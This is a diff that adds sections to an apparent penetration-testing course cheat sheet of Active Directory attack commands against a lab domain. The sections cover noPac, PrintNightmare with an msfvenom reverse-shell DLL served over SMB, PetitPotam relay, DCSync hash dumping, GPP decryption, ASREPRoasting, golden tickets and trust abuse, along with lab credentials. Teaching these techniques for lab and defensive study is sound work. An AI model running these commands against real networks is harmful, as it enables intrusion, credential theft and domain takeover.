@@ -194,3 +194,123 @@ Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,userac
 $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl	Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool Get-ObjectAcl to check a specific user's replication rights. Performed from a Windows-based host.
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss	                  Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (172.16.5.5) and save the extracted hashes to an file (inlanefreight_hashes). Performed from a Linux-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator	                          Uses Mimikatz to perform a dcsync attack from a Windows-based host.
+
+
+                                                                          Privileged Access
+Command	                                                                                                                  Description
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"	                                  PowerView based tool to used to enumerate the Remote Desktop Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"	                              PowerView based tool to used to enumerate the Remote Management Users group on a Windows target (-ComputerName ACADEMY-EA-MS01) from a Windows-based host.
+$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force	Creates a variable ($password) set equal to the password (Klmcargo2) of a user from a Windows-based host.
+$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)	Creates a variable ($cred) set equal to the username (forend) and password ($password) of a target domain account from a Windows-based host.
+Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred	                                                          Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
+evil-winrm -i 10.129.201.234 -u forend	                                                                                  Used to establish a PowerShell session with a Windows target from a Linux-based host using WinRM.
+Import-Module .\PowerUpSQL.ps1	                                                                                          Used to import the PowerUpSQL tool.
+Get-SQLInstanceDomain	                                                                                                    PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.
+Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'	PowerUpSQL tool used to connect to connect to a SQL server and query the version (-query 'Select @@version') from a Windows-based host.
+mssqlclient.py	                                                                                                          Impacket tool used to display the functionality and options provided with mssqlclient.py from a Linux-based host.
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth	                                                        Impacket tool used to connect to a MSSQL server from a Linux-based host.
+SQL> help	                                                                                                                Used to display mssqlclient.py options once connected to a MSSQL server.
+SQL> enable_xp_cmdshell	                                                                                                  Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host.
+xp_cmdshell whoami /priv	                                                                                                Used to enumerate rights on a system using xp_cmdshell.
+
+                                                                                        NoPac
+Command	                                                                                                                Description
+sudo git clone https://github.com/Ridter/noPac.git	                                                                    Used to clone a noPac exploit using git. Performed from a Linux-based host.
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap	                              Runs scanner.py to check if a target system is vulnerable to noPac/Sam_The_Admin from a Linux-based host.
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap	Used to exploit the noPac/Sam_The_Admin vulnerability and gain a SYSTEM shell (-shell). Performed from a Linux-based host.
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator	Used to exploit the noPac/Sam_The_Admin vulnerability and perform a DCSync attack against the built-in Administrator account on a Domain Controller from a Linux-based host.
+
+                                                                                  PrintNightmare
+Command	                                                                                                                  Description
+git clone https://github.com/cube0x0/CVE-2021-1675.git	                                                                  Used to clone a PrintNightmare exploit using git from a Linux-based host.
+pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install	            Used to ensure the exploit author's (cube0x0) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'	                                                                          Used to check if a Windows target has MS-PAR & MSRPRN exposed from a Linux-based host.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll	                Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.
+sudo smbserver.py -smb2support CompData /path/to/backupscript.dll	Used to create an SMB server and host a shared folder (CompData) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.
+sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'	Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.
+                                                                                  
+
+                                                                                                  PetitPotam
+Command	                                                                                                                                            Description
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController	Impacket tool used to create an NTLM relay by specifiying the web enrollment URL for the Certificate Authority host. Perfomred from a Linux-based host.
+git clone https://github.com/topotam/PetitPotam.git	                                                                                                Used to clone the PetitPotam exploit using git. Performed from a Linux-based host.
+python3 PetitPotam.py 172.16.5.225 172.16.5.5	                                                                                                      Used to execute the PetitPotam exploit by specifying the IP address of the attack host (172.16.5.255) and the target Domain Controller (172.16.5.5). Performed from a Linux-based host.
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache	                      Uses gettgtpkinit.py to request a TGT ticket for the Domain Controller (dc01.ccache) from a Linux-based host.
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL                        	Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host.
+klist	krb5-user                                                                                                                                     command used to view the contents of the ccache file. Performed from a Linux-based host.
+python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$	    Used to submit TGS requests using getnthash.py from a Linux-based host.
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba	Impacket tool used to extract hashes from NTDS.dit using a DCSync attack and a captured hash (-hashes). Performed from a Linux-based host.
+.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt                                                                              	Uses Rubeus to request a TGT and perform a pass-the-ticket attack using the machine account (/user:ACADEMY-EA-DC01$) of a Windows target. Performed from a Windows-based host.
+mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt	                                                                                              Performs a DCSync attack using Mimikatz. Performed from a Windows-based host.
+
+
+
+
+                                                                            Miscellaneous Misconfigurations
+Command	                                                                                                                  Description
+Import-Module .\SecurityAssessment.ps1	                                                                                  Used to import the module Security Assessment.ps1. Performed from a Windows-based host.
+Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL	                                                        SecurityAssessment.ps1 based tool used to enumerate a Windows target for MS-PRN Printer bug. Performed from a Windows-based host.
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5	                                                                    Used to resolve all records in a DNS zone over LDAP from a Linux-based host.
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r	                                                                Used to resolve unknown records in a DNS zone by performing an A query (-r) from a Linux-based host.
+Get-DomainUser * | Select-Object samaccountname,description	                                                              PowerView tool used to display the description field of select objects (Select-Object) on a target Windows domain from a Windows-based host.
+Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol	                              PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
+ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts	                                                                  Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.
+
+
+
+                                                                        Group Policy Enumeration & Attacks
+Command	                                                                                                          Description
+gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE	                                                          Tool used to decrypt a captured group policy preference password from a Linux-based host.
+crackmapexec smb -L | grep gpp	                                                                                  Locates and retrieves a group policy preference password using CrackMapExec, the filters the output using grep. Peformed from a Linux-based host.
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin	                                              Locates and retrieves any credentials stored in the SYSVOL share of a Windows target using CrackMapExec from a Linux-based host.
+Get-DomainGPO | select displayname	                                                                              PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.
+Get-GPO -All | Select DisplayName	                                                                                PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.
+$sid=Convert-NameToSid "Domain Users"	                                                                            Creates a variable called $sid that is set equal to the Convert-NameToSid tool and specifies the group account Domain Users. Performed from a Windows-based host.
+Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid	                                                PowerView tool that is used to check if the Domain Users (eq $sid) group has any rights over one or more GPOs. Performed from a Windows-based host.
+Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532	                                                              PowerShell cmd-let used to display the name of a GPO given a GUID. Performed from a Windows-based host.
+
+
+                                                                                ASREPRoasting
+Command	                                                                                                          Description
+Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl	            PowerView based tool used to search for the DONT_REQ_PREAUTH value across in user accounts in a target Windows domain. Performed from a Windows-based host.
+.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat	                                                    Uses Rubeus to perform an ASEP Roasting attack and formats the output for Hashcat. Performed from a Windows-based host.
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt	                                                Uses Hashcat to attempt to crack the captured hash using a wordlist (rockyou.txt). Performed from a Linux-based host.
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt	                                        Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.
+
+
+                                                            Trust Relationships - Child > Parent Trusts
+Command	                                                                                                            Description
+Import-Module activedirectory	                                                                                      Used to import the Active Directory module. Performed from a Windows-based host.
+Get-ADTrust -Filter *	                                                                                              PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
+Get-DomainTrust	                                                                                                    PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.
+Get-DomainTrustMapping	                                                                                            PowerView tool used to perform a domain trust mapping from a Windows-based host.
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName	                                      PowerView tools used to enumerate users in a target child domain from a Windows-based host.
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt	                                                                  Uses Mimikatz to obtain the KRBTGT account's NT Hash from a Windows-based host.
+Get-DomainSID	                                                                                                      PowerView tool used to get the SID for a target child domain from a Windows-based host.
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid	    PowerView tool used to obtain the Enterprise Admins group's SID from a Windows-based host.
+ls \\academy-ea-dc01.inlanefreight.local\c$	                                                                        Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt	Uses Mimikatz to create a Golden Ticket from a Windows-based host .
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt	Uses Rubeus to create a Golden Ticket from a Windows-based host.
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm	                                                            Uses Mimikatz to perform a DCSync attack from a Windows-based host.
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt	          Impacket tool used to perform a DCSync attack from a Linux-based host.
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240	                                            Impacket tool used to perform a SID Brute forcing attack from a Linux-based host.
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"	                        Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"	              Impacket tool used to retrieve the SID of a target Windows domain and attach it to the Enterprise Admin group's RID from a Linux-based host.
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker	Impacket tool used to create a Golden Ticket from a Linux-based host.
+export KRB5CCNAME=hacker.ccache	                                                                                    Used to set the KRB5CCNAME Environment Variable from a Linux-based host.
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5	Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm	                                Impacket tool that automatically performs an attack that escalates from child to parent domain.
+
+
+
+                                                          Trust Relationships - Cross-Forest
+Command	                                                                                              Description
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName	                          PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof	    PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap	                        Uses Rubeus to perform a Kerberoasting Attack against a target Windows domain (/domain:FREIGHTLOGISTICS.local) from a Windows-based host.
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL	                                          PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator	PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley	              Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host.
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2	          Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host.
+zip -r ilfreight_bh.zip *.json	Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI.
+
